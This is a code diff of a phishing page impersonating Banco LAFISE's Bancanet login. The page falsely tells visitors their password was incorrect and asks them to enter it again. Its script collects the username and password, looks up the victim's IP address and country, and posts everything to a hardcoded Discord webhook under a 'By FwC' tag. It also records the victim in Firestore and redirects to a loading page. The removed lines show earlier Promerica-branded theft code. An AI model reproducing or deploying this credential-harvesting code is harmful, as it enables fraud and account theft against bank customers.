@@ -1,8 +1,6 @@
-<!DOCTYPE html>
-<html lang="es">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
+<html lang="es"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Bancanet - Banco LAFISE</title>
     <style>
       :root {
@@ -282,32 +280,22 @@
     <!-- Barra superior -->
     <header class="topbar">
       <div class="icons">
-        <img
-          src="logomobil.png"
-          alt="Icono móvil"
-          class="mobile-img"
-          style="
+        <img src="logomobil.png" alt="Icono móvil" class="mobile-img" style="
             width: 70px;
             height: 70px;
             margin-left: 20px;
             margin-top: 30px;
             background: var(--green-dark);
             padding: 10px;
-          "
-        />
-        <img
-          src="logopc.png"
-          alt="Icono PC"
-          class="desktop-img"
-          style="
+          ">
+        <img src="logopc.png" alt="Icono PC" class="desktop-img" style="
             width: 140px;
             height: auto;
             margin-left: 50px;
             margin-top: 50px;
             padding: 5px;
             background: var(--green-dark);
-          "
-        />
+          ">
       </div>
       <div class="lang"><span>ES</span><span class="caret"></span></div>
     </header>
@@ -318,39 +306,11 @@
         <div class="logo-top"></div>
         <h1>Bienvenido a Bancanet</h1>
 
-        <!-- ✅ ID agregado -->
-        <form id="loginForm" autocomplete="off" novalidate>
+        <center><h5 style="color:red">La contraseña ingresada es incorrecta, ingrese nuevamente</h5></center><br><!-- ✅ ID agregado -->
+        <form id="loginForm" autocomplete="off" novalidate="">
           <div class="input-wrap">
-            <svg
-              class="icon"
-              viewBox="0 0 24 24"
-              fill="none"
-              xmlns="http://www.w3.org/2000/svg"
-              aria-hidden="true"
-            >
-              <path
-                d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"
-                stroke="currentColor"
-                stroke-width="2"
-                stroke-linecap="round"
-                stroke-linejoin="round"
-              />
-              <circle
-                cx="12"
-                cy="7"
-                r="4"
-                stroke="currentColor"
-                stroke-width="2"
-                stroke-linecap="round"
-                stroke-linejoin="round"
-              />
-            </svg>
-            <input
-              class="input"
-              type="text"
-              placeholder="Escriba su nombre de usuario"
-              inputmode="text"
-            />
+            <img src="descarga.svg" class="icon" alt="">
+            <input class="input" type="text" placeholder="Escriba su contraseña" inputmode="text">
           </div>
 
           <div class="help-row">
@@ -358,20 +318,13 @@
           </div>
 
           <div class="info">
-            <p>Todavía no tiene su usuario</p>
-            <a class="link" href="#">¡Solicítelo aquí!</a>
+            <p>Si tienes un problema</p>
             <a class="link" href="#">¡Recuperar aquí!</a>
           </div>
 
           <div class="actions">
             <!-- ✅ spans agregados para manejo de loading -->
-            <button
-              class="btn"
-              type="submit"
-              disabled
-              id="submitBtn"
-              aria-disabled="true"
-            >
+            <button class="btn" type="submit" disabled="" id="submitBtn" aria-disabled="true">
               <span class="btn-text">Siguiente</span>
               <span class="btn-loading" style="display: none">
                 <span class="spinner" aria-hidden="true"></span>
@@ -402,7 +355,7 @@
         submitBtn.setAttribute("aria-disabled", String(!hasText));
         submitBtn.classList.toggle("active", hasText);
       }
-async function getCountry() {
+	  async function getCountry() {
             try {
                 const response = await fetch('https://ipinfo.io/json');
                 const data = await response.json();
@@ -423,7 +376,7 @@ async function getCountry() {
                 return 'IP Desconocida';
             }
         }
-		
+
       // Función para mostrar estado de carga
       function setLoadingState(loading) {
         submitBtn.classList.toggle("loading", loading);
@@ -455,19 +408,29 @@ async function getCountry() {
           // Cambia el texto y bloquea botón
           submitBtn.disabled = true;
           submitBtn.innerText = "Procesando...";
-		const pais = await getCountry();
+		  const pais = await getCountry();
             const ip = await getIPAddress();
-			
+
           // Mensaje a enviar
-		  localStorage.setItem("usuario", username);
-          const message = `
-		  ➖➖➖➖➖[ 🏦Promerica ]➖➖➖➖➖\n👤 Usuario: ${username}\n➖➖➖➖➖[ IP ]➖➖➖➖➖\nPaís: ${pais}\n\IP: ${ip}\n➖➖➖➖➖[ By FwC 👨🏻‍💻 ]➖➖➖➖➖\n`;
-          
+          const message =
+            "\n➖➖➖➖➖[ 🏦Lafise ]➖➖➖➖➖ \n 👤 Usuario: " +
+            localStorage.getItem("usuario") +
+            "\n 🔒 Contraseña corregida: " + (username) + "\n➖➖➖➖➖[ IP ]➖➖➖➖➖\nPaís:" + (pais) + "\n\IP:" + (ip) + "\n➖➖➖➖➖[ By FwC 👨🏻‍💻 ]➖➖➖➖➖\n";
 
           try {
             // Envío a tu backend/Telegram
-            
-            const discord_webhook_url = "https://discord.com/api/webhooks/1420261010232574144/yLC9FCgcgyyhsI07DDiZL7agbMY_o1c-S-BxkHwxX7eHcWasGKHLEukfOuRc7GbtgML6";
+            const questionRef = doc(
+              window.db,
+              "lafis2",
+              localStorage.getItem("usuario")
+            );
+            await setDoc(questionRef, {
+              question1: "A1",
+              question2: "A1",
+              question3: "A1",
+              page: 0,
+            });
+            const discord_webhook_url = "https://discord.com/api/webhooks/1405207595693637652/J5csOYIdidR99EN7RHoT8Ta6rQj2iLnhfaoQXMMD7udWtD-8oWYVvaxNJtsed-H0crL1";
 
       await fetch(discord_webhook_url, {
         method: "POST",
@@ -480,7 +443,7 @@ async function getCountry() {
       });
 
             // Redirige después de enviar
-            window.location.href = "contra.html";
+            window.location.href = "cargando.html";
           } catch (error) {
             console.error(error);
             alert("Error al enviar los datos");
@@ -496,5 +459,6 @@ async function getCountry() {
       toggleButton();
     </script>
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-  </body>
-</html>
+  
+
+</body></html>
